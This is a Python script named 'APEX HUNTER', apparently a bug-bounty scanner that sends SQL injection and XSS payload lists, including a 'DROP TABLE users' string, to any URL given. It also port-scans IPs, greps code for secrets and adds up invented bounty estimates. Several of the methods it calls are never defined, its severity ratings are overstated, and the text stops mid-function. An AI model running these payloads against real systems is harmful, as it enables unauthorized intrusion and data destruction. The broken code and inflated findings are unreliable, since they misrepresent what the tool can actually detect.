#!/usr/bin/env python3
"""
APEX HUNTER - Multi-Target Analysis Engine
Supports: URLs, IPs, APKs, Source Code, GitHub Repos
Generates: Videos, Screenshots, Complete Evidence Packages
"""

import os
import sys
import json
import time
import subprocess
import requests
import zipfile
import tempfile
import shutil
from pathlib import Path
import threading
import queue
import hashlib
import base64
from urllib.parse import urlparse
import sqlite3
import cv2
import numpy as np
from PIL import Image, ImageDraw, ImageFont
import logging

class MultiTargetAnalyzer:
    def __init__(self, max_ram_mb=1800):
        self.max_ram = max_ram_mb
        self.evidence_dir = Path("evidence")
        self.evidence_dir.mkdir(exist_ok=True)
        self.temp_dir = Path(tempfile.mkdtemp())
        self.findings = []
        self.chains = []
        self.evidence_files = []
        self.target_type = None
        self.target_data = None
        
        # Setup logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
        
        # Initialize video recording
        self.video_writer = None
        self.screenshot_count = 0
        
    def analyze_target(self, target_input, target_type="auto"):
        """
        Analyze any type of target with comprehensive evidence collection
        """
        self.logger.info(f"🎯 Starting multi-target analysis: {target_input}")
        
        # Detect target type if auto
        if target_type == "auto":
            target_type = self.detect_target_type(target_input)
        
        self.target_type = target_type
        self.target_data = target_input
        
        # Start evidence collection
        self.start_evidence_collection()
        
        try:
            if target_type == "url":
                return self.analyze_web_target(target_input)
            elif target_type == "ip":
                return self.analyze_ip_target(target_input)
            elif target_type == "apk":
                return self.analyze_apk_target(target_input)
            elif target_type == "source_code":
                return self.analyze_source_code(target_input)
            elif target_type == "github":
                return self.analyze_github_repo(target_input)
            elif target_type == "file_upload":
                return self.analyze_uploaded_file(target_input)
            else:
                raise ValueError(f"Unsupported target type: {target_type}")
                
        finally:
            self.stop_evidence_collection()
            
    def detect_target_type(self, target_input):
        """Auto-detect target type from input"""
        if target_input.startswith(("http://", "https://")):
            return "url"
        elif target_input.startswith("github.com") or "github.com" in target_input:
            return "github"
        elif target_input.endswith(".apk"):
            return "apk"
        elif self.is_ip_address(target_input):
            return "ip"
        elif os.path.isfile(target_input):
            return "file_upload"
        elif os.path.isdir(target_input):
            return "source_code"
        else:
            # Try to parse as URL without protocol
            try:
                if "." in target_input and not "/" in target_input:
                    return "url"
            except:
                pass
        return "unknown"
    
    def is_ip_address(self, target):
        """Check if target is an IP address"""
        import ipaddress
        try:
            ipaddress.ip_address(target)
            return True
        except:
            return False
    
    def start_evidence_collection(self):
        """Start video recording and screenshot collection"""
        self.logger.info("📹 Starting evidence collection...")
        
        # Create evidence directory for this session
        timestamp = int(time.time())
        self.session_dir = self.evidence_dir / f"session_{timestamp}"
        self.session_dir.mkdir(exist_ok=True)
        
        # Start video recording
        self.start_video_recording()
        
        # Take initial screenshot
        self.take_screenshot("initial_state")
    
    def start_video_recording(self):
        """Start screen recording for PoC video"""
        try:
            video_path = self.session_dir / "poc_video.mp4"
            
            # Use ffmpeg for screen recording
            cmd = [
                'ffmpeg', '-y', '-f', 'x11grab', '-draw_mouse', '1',
                '-s', '1920x1080', '-i', ':0.0+0,0',
                '-c:v', 'libx264', '-preset', 'ultrafast',
                '-crf', '23', '-r', '15',
                str(video_path)
            ]
            
            self.video_process = subprocess.Popen(
                cmd, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )
            
            self.logger.info(f"📹 Video recording started: {video_path}")
            
        except Exception as e:
            self.logger.warning(f"Video recording failed: {e}")
            self.video_process = None
    
    def take_screenshot(self, description=""):
        """Take a screenshot with description"""
        try:
            self.screenshot_count += 1
            screenshot_path = self.session_dir / f"screenshot_{self.screenshot_count:03d}_{description}.png"
            
            # Use scrot or gnome-screenshot
            cmd = ['scrot', str(screenshot_path)]
            subprocess.run(cmd, check=True, capture_output=True)
            
            # Add annotation
            self.annotate_screenshot(screenshot_path, description)
            
            self.evidence_files.append({
                'type': 'screenshot',
                'path': str(screenshot_path),
                'description': description,
                'timestamp': time.time()
            })
            
            self.logger.info(f"📸 Screenshot taken: {description}")
            
        except Exception as e:
            self.logger.warning(f"Screenshot failed: {e}")
    
    def annotate_screenshot(self, image_path, description):
        """Add annotation to screenshot"""
        try:
            img = Image.open(image_path)
            draw = ImageDraw.Draw(img)
            
            # Add timestamp and description
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            text = f"{timestamp} - {description}"
            
            # Use default font
            try:
                font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
            except:
                font = ImageFont.load_default()
            
            # Add background rectangle
            bbox = draw.textbbox((10, 10), text, font=font)
            draw.rectangle(bbox, fill="black", outline="red")
            draw.text((10, 10), text, fill="white", font=font)
            
            img.save(image_path)
            
        except Exception as e:
            self.logger.warning(f"Screenshot annotation failed: {e}")
    
    def analyze_web_target(self, url):
        """Comprehensive web application analysis"""
        self.logger.info(f"🌐 Analyzing web target: {url}")
        
        findings = []
        
        # Ensure URL has protocol
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"
        
        self.take_screenshot(f"analyzing_web_target_{urlparse(url).netloc}")
        
        # 1. Basic reconnaissance
        findings.extend(self.web_reconnaissance(url))
        
        # 2. Technology detection
        findings.extend(self.detect_technologies(url))
        
        # 3. Subdomain enumeration
        findings.extend(self.enumerate_subdomains(url))
        
        # 4. Directory enumeration
        findings.extend(self.enumerate_directories(url))
        
        # 5. Vulnerability scanning
        findings.extend(self.scan_web_vulnerabilities(url))
        
        # 6. API endpoint discovery
        findings.extend(self.discover_api_endpoints(url))
        
        # 7. JavaScript analysis
        findings.extend(self.analyze_javascript(url))
        
        # 8. Form analysis
        findings.extend(self.analyze_forms(url))
        
        # 9. Cookie analysis
        findings.extend(self.analyze_cookies(url))
        
        # 10. Header analysis
        findings.extend(self.analyze_headers(url))
        
        self.findings.extend(findings)
        return self.generate_chains(findings)
    
    def analyze_ip_target(self, ip):
        """Comprehensive IP address analysis"""
        self.logger.info(f"🔍 Analyzing IP target: {ip}")
        
        findings = []
        
        self.take_screenshot(f"analyzing_ip_{ip.replace('.', '_')}")
        
        # 1. Port scanning
        findings.extend(self.port_scan(ip))
        
        # 2. Service enumeration
        findings.extend(self.enumerate_services(ip))
        
        # 3. OS detection
        findings.extend(self.detect_os(ip))
        
        # 4. Vulnerability scanning
        findings.extend(self.scan_ip_vulnerabilities(ip))
        
        # 5. Banner grabbing
        findings.extend(self.grab_banners(ip))
        
        # 6. SSL/TLS analysis
        findings.extend(self.analyze_ssl(ip))
        
        self.findings.extend(findings)
        return self.generate_chains(findings)
    
    def analyze_apk_target(self, apk_path):
        """Comprehensive APK analysis"""
        self.logger.info(f"📱 Analyzing APK: {apk_path}")
        
        findings = []
        
        self.take_screenshot(f"analyzing_apk_{Path(apk_path).stem}")
        
        # 1. APK information extraction
        findings.extend(self.extract_apk_info(apk_path))
        
        # 2. Manifest analysis
        findings.extend(self.analyze_manifest(apk_path))
        
        # 3. Permission analysis
        findings.extend(self.analyze_permissions(apk_path))
        
        # 4. Code analysis
        findings.extend(self.analyze_apk_code(apk_path))
        
        # 5. Resource analysis
        findings.extend(self.analyze_apk_resources(apk_path))
        
        # 6. Network analysis
        findings.extend(self.analyze_apk_network(apk_path))
        
        # 7. Cryptographic analysis
        findings.extend(self.analyze_apk_crypto(apk_path))
        
        # 8. Dynamic analysis setup
        findings.extend(self.setup_dynamic_analysis(apk_path))
        
        self.findings.extend(findings)
        return self.generate_chains(findings)
    
    def analyze_source_code(self, code_path):
        """Comprehensive source code analysis"""
        self.logger.info(f"💻 Analyzing source code: {code_path}")
        
        findings = []
        
        self.take_screenshot(f"analyzing_source_{Path(code_path).name}")
        
        # 1. Language detection
        findings.extend(self.detect_languages(code_path))
        
        # 2. Dependency analysis
        findings.extend(self.analyze_dependencies(code_path))
        
        # 3. Security pattern scanning
        findings.extend(self.scan_security_patterns(code_path))
        
        # 4. Hardcoded secrets detection
        findings.extend(self.detect_secrets(code_path))
        
        # 5. SQL injection patterns
        findings.extend(self.detect_sql_injection_patterns(code_path))
        
        # 6. XSS patterns
        findings.extend(self.detect_xss_patterns(code_path))
        
        # 7. Authentication flaws
        findings.extend(self.detect_auth_flaws(code_path))
        
        # 8. Configuration analysis
        findings.extend(self.analyze_configurations(code_path))
        
        self.findings.extend(findings)
        return self.generate_chains(findings)
    
    def analyze_github_repo(self, repo_url):
        """Comprehensive GitHub repository analysis"""
        self.logger.info(f"🐙 Analyzing GitHub repo: {repo_url}")
        
        findings = []
        
        # Clone repository
        repo_path = self.clone_repository(repo_url)
        if not repo_path:
            return []
        
        self.take_screenshot(f"analyzing_github_{Path(repo_url).name}")
        
        # 1. Repository metadata analysis
        findings.extend(self.analyze_repo_metadata(repo_url, repo_path))
        
        # 2. Commit history analysis
        findings.extend(self.analyze_commit_history(repo_path))
        
        # 3. Branch analysis
        findings.extend(self.analyze_branches(repo_path))
        
        # 4. Issue and PR analysis
        findings.extend(self.analyze_issues_prs(repo_url))
        
        # 5. Source code analysis
        findings.extend(self.analyze_source_code(repo_path))
        
        # 6. CI/CD analysis
        findings.extend(self.analyze_cicd(repo_path))
        
        # 7. Documentation analysis
        findings.extend(self.analyze_documentation(repo_path))
        
        self.findings.extend(findings)
        return self.generate_chains(findings)
    
    def web_reconnaissance(self, url):
        """Basic web reconnaissance"""
        findings = []
        
        try:
            response = requests.get(url, timeout=10, verify=False)
            
            findings.append({
                'type': 'web_info',
                'severity': 'info',
                'title': 'HTTP Response Analysis',
                'description': f'Status: {response.status_code}, Size: {len(response.content)} bytes',
                'evidence': {
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'content_length': len(response.content)
                },
                'timestamp': time.time()
            })
            
            # Check for common vulnerabilities in response
            if 'Server' in response.headers:
                server = response.headers['Server']
                findings.append({
                    'type': 'server_disclosure',
                    'severity': 'low',
                    'title': 'Server Information Disclosure',
                    'description': f'Server header reveals: {server}',
                    'evidence': {'server_header': server},
                    'timestamp': time.time()
                })
            
            # Check for security headers
            security_headers = [
                'X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options',
                'Strict-Transport-Security', 'Content-Security-Policy'
            ]
            
            missing_headers = []
            for header in security_headers:
                if header not in response.headers:
                    missing_headers.append(header)
            
            if missing_headers:
                findings.append({
                    'type': 'missing_security_headers',
                    'severity': 'medium',
                    'title': 'Missing Security Headers',
                    'description': f'Missing headers: {", ".join(missing_headers)}',
                    'evidence': {'missing_headers': missing_headers},
                    'timestamp': time.time()
                })
            
        except Exception as e:
            findings.append({
                'type': 'connection_error',
                'severity': 'info',
                'title': 'Connection Error',
                'description': f'Failed to connect: {str(e)}',
                'evidence': {'error': str(e)},
                'timestamp': time.time()
            })
        
        return findings
    
    def scan_web_vulnerabilities(self, url):
        """Advanced web vulnerability scanning"""
        findings = []
        
        # SQL Injection testing
        findings.extend(self.test_sql_injection(url))
        
        # XSS testing
        findings.extend(self.test_xss(url))
        
        # IDOR testing
        findings.extend(self.test_idor(url))
        
        # Command injection testing
        findings.extend(self.test_command_injection(url))
        
        # File inclusion testing
        findings.extend(self.test_file_inclusion(url))
        
        # XXE testing
        findings.extend(self.test_xxe(url))
        
        # SSRF testing
        findings.extend(self.test_ssrf(url))
        
        return findings
    
    def test_sql_injection(self, url):
        """Advanced SQL injection testing with multiple payloads"""
        findings = []
        
        # SQL injection payloads for different contexts
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "' UNION SELECT 1,2,3 --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
            "1' AND SLEEP(5) --",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
        ]
        
        # Test different parameters
        test_params = ['id', 'user', 'search', 'q', 'name', 'email', 'username']
        
        for param in test_params:
            for payload in payloads:
                try:
                    # Test GET parameter
                    test_url = f"{url}?{param}={payload}"
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10, verify=False)
                    response_time = time.time() - start_time
                    
                    # Check for SQL error patterns
                    error_patterns = [
                        'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB',
                        'SQLServer JDBC Driver', 'PostgreSQL query failed',
                        'Warning: mysql_', 'MySQLSyntaxErrorException',
                        'valid MySQL result', 'check the manual that corresponds'
                    ]
                    
                    for pattern in error_patterns:
                        if pattern.lower() in response.text.lower():
                            findings.append({
                                'type': 'sql_injection',
                                'severity': 'critical',
                                'title': 'SQL Injection Vulnerability',
                                'description': f'SQL injection detected in parameter "{param}"',
                                'evidence': {
                                    'parameter': param,
                                    'payload': payload,
                                    'error_pattern': pattern,
                                    'url': test_url,
                                    'response_snippet': response.text[:500]
                                },
                                'poc': self.generate_sql_injection_poc(url, param, payload),
                                'timestamp': time.time()
                            })
                            
                            # Take screenshot of vulnerability
                            self.take_screenshot(f"sql_injection_{param}")
                            break
                    
                    # Check for time-based injection
                    if 'SLEEP' in payload and response_time > 4:
                        findings.append({
                            'type': 'sql_injection_time_based',
                            'severity': 'critical',
                            'title': 'Time-based SQL Injection',
                            'description': f'Time-based SQL injection in parameter "{param}"',
                            'evidence': {
                                'parameter': param,
                                'payload': payload,
                                'response_time': response_time,
                                'url': test_url
                            },
                            'poc': self.generate_time_based_sql_poc(url, param, payload),
                            'timestamp': time.time()
                        })
                        
                        self.take_screenshot(f"time_based_sql_{param}")
                
                except Exception as e:
                    continue
        
        return findings
    
    def generate_sql_injection_poc(self, url, param, payload):
        """Generate detailed SQL injection PoC"""
        return {
            'title': 'SQL Injection Proof of Concept',
            'steps': [
                f'1. Navigate to: {url}',
                f'2. Inject payload in parameter "{param}": {payload}',
                f'3. Observe database error in response',
                f'4. Exploit: Extract database information using UNION queries',
                f'5. Impact: Full database compromise possible'
            ],
            'curl_command': f'curl -X GET "{url}?{param}={payload}"',
            'severity': 'Critical',
            'cvss': '9.8',
            'cwe': 'CWE-89',
            'remediation': [
                'Use parameterized queries/prepared statements',
                'Implement input validation and sanitization',
                'Apply principle of least privilege to database accounts',
                'Use stored procedures where appropriate'
            ]
        }
    
    def test_xss(self, url):
        """Advanced XSS testing"""
        findings = []
        
        # XSS payloads for different contexts
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src=x onerror=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>'
        ]
        
        test_params = ['q', 'search', 'name', 'comment', 'message', 'input']
        
        for param in test_params:
            for payload in payloads:
                try:
                    # Test GET parameter
                    test_url = f"{url}?{param}={payload}"
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        findings.append({
                            'type': 'xss_reflected',
                            'severity': 'high',
                            'title': 'Reflected XSS Vulnerability',
                            'description': f'XSS payload reflected in parameter "{param}"',
                            'evidence': {
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'response_snippet': response.text[:1000]
                            },
                            'poc': self.generate_xss_poc(url, param, payload),
                            'timestamp': time.time()
                        })
                        
                        self.take_screenshot(f"xss_reflected_{param}")
                    
                    # Test POST parameter
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=10, verify=False)
                    
                    if payload in response.text:
                        findings.append({
                            'type': 'xss_reflected_post',
                            'severity': 'high',
                            'title': 'Reflected XSS (POST)',
                            'description': f'XSS payload reflected in POST parameter "{param}"',
                            'evidence': {
                                'parameter': param,
                                'payload': payload,
                                'method': 'POST',
                                'response_snippet': response.text[:1000]
                            },
                            'poc': self.generate_xss_post_poc(url, param, payload),
                            'timestamp': time.time()
                        })
                        
                        self.take_screenshot(f"xss_post_{param}")
                
                except Exception as e:
                    continue
        
        return findings
    
    def generate_xss_poc(self, url, param, payload):
        """Generate detailed XSS PoC"""
        return {
            'title': 'Cross-Site Scripting (XSS) Proof of Concept',
            'steps': [
                f'1. Navigate to: {url}',
                f'2. Inject XSS payload in parameter "{param}": {payload}',
                f'3. Observe JavaScript execution in browser',
                f'4. Exploit: Steal session cookies, redirect users, deface page',
                f'5. Impact: Account takeover, data theft, malware distribution'
            ],
            'curl_command': f'curl -X GET "{url}?{param}={payload}"',
            'severity': 'High',
            'cvss': '7.5',
            'cwe': 'CWE-79',
            'remediation': [
                'Implement proper output encoding/escaping',
                'Use Content Security Policy (CSP)',
                'Validate and sanitize all user inputs',
                'Use secure frameworks that auto-escape output'
            ]
        }
    
    def port_scan(self, ip):
        """Comprehensive port scanning"""
        findings = []
        
        # Common ports to scan
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379]
        
        for port in common_ports:
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    findings.append({
                        'type': 'open_port',
                        'severity': 'info',
                        'title': f'Open Port: {port}',
                        'description': f'Port {port} is open on {ip}',
                        'evidence': {
                            'ip': ip,
                            'port': port,
                            'service': self.get_service_name(port)
                        },
                        'timestamp': time.time()
                    })
            except Exception as e:
                continue
        
        return findings
    
    def get_service_name(self, port):
        """Get service name for port"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'RPC', 139: 'NetBIOS',
            143: 'IMAP', 443: 'HTTPS', 993: 'IMAPS', 995: 'POP3S',
            1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            5900: 'VNC', 6379: 'Redis'
        }
        return services.get(port, 'Unknown')
    
    def extract_apk_info(self, apk_path):
        """Extract APK information using aapt"""
        findings = []
        
        try:
            # Use aapt to extract APK info
            cmd = ['aapt', 'dump', 'badging', apk_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                output = result.stdout
                
                # Extract package name
                if 'package: name=' in output:
                    package_line = [line for line in output.split('\n') if 'package: name=' in line][0]
                    package_name = package_line.split("name='")[1].split("'")[0]
                    
                    findings.append({
                        'type': 'apk_info',
                        'severity': 'info',
                        'title': 'APK Package Information',
                        'description': f'Package: {package_name}',
                        'evidence': {
                            'package_name': package_name,
                            'apk_path': apk_path
                        },
                        'timestamp': time.time()
                    })
                
                # Extract permissions
                permissions = []
                for line in output.split('\n'):
                    if 'uses-permission:' in line:
                        perm = line.split("name='")[1].split("'")[0]
                        permissions.append(perm)
                
                if permissions:
                    findings.append({
                        'type': 'apk_permissions',
                        'severity': 'medium',
                        'title': 'APK Permissions Analysis',
                        'description': f'Found {len(permissions)} permissions',
                        'evidence': {
                            'permissions': permissions,
                            'dangerous_permissions': [p for p in permissions if self.is_dangerous_permission(p)]
                        },
                        'timestamp': time.time()
                    })
        
        except Exception as e:
            findings.append({
                'type': 'apk_analysis_error',
                'severity': 'info',
                'title': 'APK Analysis Error',
                'description': f'Failed to analyze APK: {str(e)}',
                'evidence': {'error': str(e)},
                'timestamp': time.time()
            })
        
        return findings
    
    def is_dangerous_permission(self, permission):
        """Check if permission is dangerous"""
        dangerous_perms = [
            'android.permission.READ_CONTACTS',
            'android.permission.WRITE_CONTACTS',
            'android.permission.READ_SMS',
            'android.permission.SEND_SMS',
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.ACCESS_COARSE_LOCATION',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WRITE_EXTERNAL_STORAGE'
        ]
        return permission in dangerous_perms
    
    def clone_repository(self, repo_url):
        """Clone GitHub repository"""
        try:
            repo_name = repo_url.split('/')[-1].replace('.git', '')
            repo_path = self.temp_dir / repo_name
            
            cmd = ['git', 'clone', repo_url, str(repo_path)]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                return repo_path
            else:
                self.logger.error(f"Failed to clone repository: {result.stderr}")
                return None
        
        except Exception as e:
            self.logger.error(f"Repository cloning error: {e}")
            return None
    
    def detect_secrets(self, code_path):
        """Detect hardcoded secrets in source code"""
        findings = []
        
        # Secret patterns
        secret_patterns = [
            (r'password\s*=\s*["\'][^"\']+["\']', 'Hardcoded Password'),
            (r'api_key\s*=\s*["\'][^"\']+["\']', 'API Key'),
            (r'secret_key\s*=\s*["\'][^"\']+["\']', 'Secret Key'),
            (r'private_key\s*=\s*["\'][^"\']+["\']', 'Private Key'),
            (r'token\s*=\s*["\'][^"\']+["\']', 'Token'),
            (r'aws_access_key_id\s*=\s*["\'][^"\']+["\']', 'AWS Access Key'),
            (r'aws_secret_access_key\s*=\s*["\'][^"\']+["\']', 'AWS Secret Key'),
            (r'-----BEGIN PRIVATE KEY-----', 'Private Key Block'),
            (r'-----BEGIN RSA PRIVATE KEY-----', 'RSA Private Key'),
        ]
        
        import re
        
        for root, dirs, files in os.walk(code_path):
            for file in files:
                if file.endswith(('.py', '.js', '.java', '.php', '.rb', '.go', '.cpp', '.c', '.h')):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            for pattern, secret_type in secret_patterns:
                                matches = re.finditer(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    findings.append({
                                        'type': 'hardcoded_secret',
                                        'severity': 'critical',
                                        'title': f'{secret_type} Found',
                                        'description': f'Hardcoded {secret_type.lower()} in {file}',
                                        'evidence': {
                                            'file': file_path,
                                            'line': content[:match.start()].count('\n') + 1,
                                            'match': match.group(),
                                            'secret_type': secret_type
                                        },
                                        'poc': self.generate_secret_poc(file_path, secret_type, match.group()),
                                        'timestamp': time.time()
                                    })
                    except Exception as e:
                        continue
        
        return findings
    
    def generate_secret_poc(self, file_path, secret_type, match):
        """Generate PoC for hardcoded secrets"""
        return {
            'title': f'{secret_type} Exposure Proof of Concept',
            'steps': [
                f'1. Navigate to file: {file_path}',
                f'2. Locate hardcoded {secret_type.lower()}: {match}',
                f'3. Extract and use credentials for unauthorized access',
                f'4. Impact: Complete system compromise possible'
            ],
            'severity': 'Critical',
            'cvss': '9.8',
            'cwe': 'CWE-798',
            'remediation': [
                'Remove hardcoded secrets from source code',
                'Use environment variables or secure vaults',
                'Implement proper secret management',
                'Rotate compromised credentials immediately'
            ]
        }
    
    def generate_chains(self, findings):
        """Generate exploit chains from findings"""
        chains = []
        
        # Group findings by severity and type
        critical_findings = [f for f in findings if f.get('severity') == 'critical']
        high_findings = [f for f in findings if f.get('severity') == 'high']
        medium_findings = [f for f in findings if f.get('severity') == 'medium']
        
        # Chain 1: SQL Injection + IDOR = Data Extraction
        sql_findings = [f for f in findings if f.get('type', '').startswith('sql_injection')]
        idor_findings = [f for f in findings if f.get('type') == 'idor']
        
        if sql_findings and idor_findings:
            chains.append({
                'name': 'SQL Injection + IDOR Data Extraction Chain',
                'severity': 'critical',
                'components': sql_findings + idor_findings,
                'description': 'Combine SQL injection with IDOR to extract sensitive data',
                'impact': 'Complete database compromise and unauthorized data access',
                'bounty_estimate': '$5,000-$15,000',
                'poc': self.generate_chain_poc('sql_idor', sql_findings + idor_findings),
                'timestamp': time.time()
            })
        
        # Chain 2: XSS + Session Management = Account Takeover
        xss_findings = [f for f in findings if f.get('type', '').startswith('xss')]
        session_findings = [f for f in findings if 'session' in f.get('description', '').lower()]
        
        if xss_findings and session_findings:
            chains.append({
                'name': 'XSS + Session Hijacking Chain',
                'severity': 'critical',
                'components': xss_findings + session_findings,
                'description': 'Use XSS to steal session tokens for account takeover',
                'impact': 'Complete account compromise of any user',
                'bounty_estimate': '$3,000-$10,000',
                'poc': self.generate_chain_poc('xss_session', xss_findings + session_findings),
                'timestamp': time.time()
            })
        
        # Chain 3: Multiple Medium Findings = High Impact
        if len(medium_findings) >= 3:
            chains.append({
                'name': 'Multiple Vulnerability Chain',
                'severity': 'high',
                'components': medium_findings[:3],
                'description': 'Combine multiple medium vulnerabilities for high impact',
                'impact': 'Escalated privileges and data access',
                'bounty_estimate': '$1,500-$5,000',
                'poc': self.generate_chain_poc('multiple_medium', medium_findings[:3]),
                'timestamp': time.time()
            })
        
        self.chains.extend(chains)
        return chains
    
    def generate_chain_poc(self, chain_type, components):
        """Generate PoC for exploit chains"""
        if chain_type == 'sql_idor':
            return {
                'title': 'SQL Injection + IDOR Data Extraction Chain',
                'steps': [
                    '1. Identify SQL injection vulnerability in search parameter',
                    '2. Extract database schema using UNION queries',
                    '3. Identify user table and sensitive data columns',
                    '4. Use IDOR vulnerability to access other users\' data',
                    '5. Combine both to extract complete user database',
                    '6. Impact: Full customer database compromise'
                ],
                'severity': 'Critical',
                'cvss': '9.8',
                'business_impact': 'Complete data breach, regulatory fines, reputation damage',
                'remediation': [
                    'Fix SQL injection with parameterized queries',
                    'Implement proper access controls for IDOR',
                    'Add rate limiting and monitoring',
                    'Encrypt sensitive data at rest'
                ]
            }
        elif chain_type == 'xss_session':
            return {
                'title': 'XSS + Session Hijacking Account Takeover Chain',
                'steps': [
                    '1. Identify XSS vulnerability in user input field',
                    '2. Craft payload to steal session cookies',
                    '3. Set up malicious server to collect stolen sessions',
                    '4. Trick users into executing XSS payload',
                    '5. Use stolen session tokens to impersonate users',
                    '6. Impact: Complete account takeover of any user'
                ],
                'severity': 'Critical',
                'cvss': '8.8',
                'business_impact': 'Account takeover, data theft, unauthorized transactions',
                'remediation': [
                    'Implement proper output encoding for XSS prevention',
                    'Use HttpOnly and Secure flags on session cookies',
                    'Implement Content Security Policy (CSP)',
                    'Add session validation and monitoring'
                ]
            }
        else:
            return {
                'title': 'Multiple Vulnerability Exploitation Chain',
                'steps': [
                    '1. Enumerate multiple medium-severity vulnerabilities',
                    '2. Identify relationships between vulnerabilities',
                    '3. Chain exploits to escalate impact',
                    '4. Achieve higher privileges or data access',
                    '5. Impact: Escalated attack beyond individual vulnerabilities'
                ],
                'severity': 'High',
                'cvss': '7.5',
                'business_impact': 'Privilege escalation, unauthorized access',
                'remediation': [
                    'Address all identified vulnerabilities',
                    'Implement defense in depth',
                    'Regular security assessments',
                    'Security awareness training'
                ]
            }
    
    def stop_evidence_collection(self):
        """Stop video recording and finalize evidence"""
        self.logger.info("🛑 Stopping evidence collection...")
        
        # Stop video recording
        if hasattr(self, 'video_process') and self.video_process:
            self.video_process.terminate()
            self.video_process.wait()
            
            video_path = self.session_dir / "poc_video.mp4"
            if video_path.exists():
                self.evidence_files.append({
                    'type': 'video',
                    'path': str(video_path),
                    'description': 'Complete PoC video recording',
                    'timestamp': time.time()
                })
        
        # Take final screenshot
        self.take_screenshot("analysis_complete")
        
        # Generate evidence report
        self.generate_evidence_report()
    
    def generate_evidence_report(self):
        """Generate comprehensive evidence report"""
        report_path = self.session_dir / "evidence_report.json"
        
        report = {
            'session_info': {
                'target': self.target_data,
                'target_type': self.target_type,
                'timestamp': time.time(),
                'session_dir': str(self.session_dir)
            },
            'findings': self.findings,
            'chains': self.chains,
            'evidence_files': self.evidence_files,
            'summary': {
                'total_findings': len(self.findings),
                'critical_findings': len([f for f in self.findings if f.get('severity') == 'critical']),
                'high_findings': len([f for f in self.findings if f.get('severity') == 'high']),
                'medium_findings': len([f for f in self.findings if f.get('severity') == 'medium']),
                'low_findings': len([f for f in self.findings if f.get('severity') == 'low']),
                'total_chains': len(self.chains),
                'estimated_total_bounty': self.calculate_total_bounty()
            }
        }
        
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"📄 Evidence report generated: {report_path}")
        return report_path
    
    def calculate_total_bounty(self):
        """Calculate estimated total bounty"""
        total = 0
        
        # Individual findings
        for finding in self.findings:
            severity = finding.get('severity', 'low')
            if severity == 'critical':
                total += 2500  # Average critical bounty
            elif severity == 'high':
                total += 1000  # Average high bounty
            elif severity == 'medium':
                total += 300   # Average medium bounty
            elif severity == 'low':
                total += 100   # Average low bounty
        
        # Chain bonuses
        for chain in self.chains:
            if chain.get('severity') == 'critical':
                total += 5000  # Chain bonus
            elif chain.get('severity') == 'high':
                total += 2000  # Chain bonus
        
        return total

def main():
    """Main function for command-line usage"""
    if len(sys.argv) < 2:
        print("Usage: python multi_target_analyzer.py <target> [target_type]")
        print("Target types: url, ip, apk, source_code, github, auto")
        print("Examples:")
        print("  python multi_target_analyzer.py https://example.com")
        print("  python multi_target_analyzer.py 192.168.1.1 ip")
        print("  python multi_target_analyzer.py app.apk apk")
        print("  python multi_target_analyzer.py /path/to/source source_code")
        print("  python multi_target_analyzer.py https://github.com/user/repo github")
        return
    
    target = sys.argv[1]
    target_type = sys.argv[2] if len(sys.argv) > 2 else "auto"
    
    analyzer = MultiTargetAnalyzer()
    
    print(f"🎯 APEX HUNTER - Multi-Target Analysis")
    print(f"Target: {target}")
    print(f"Type: {target_type}")
    print("=" * 50)
    
    try:
        results = analyzer.analyze_target(target, target_type)
        
        print(f"\n✅ Analysis Complete!")
        print(f"📊 Findings: {len(analyzer.findings)}")
        print(f"⛓️ Chains: {len(analyzer.chains)}")
        print(f"💰 Estimated Bounty: ${analyzer.calculate_total_bounty()}")
        print(f"📁 Evidence: {analyzer.session_dir}")
        
        # Display top findings
        critical_findings = [f for f in analyzer.findings if f.get('severity') == 'critical']
        if critical_findings:
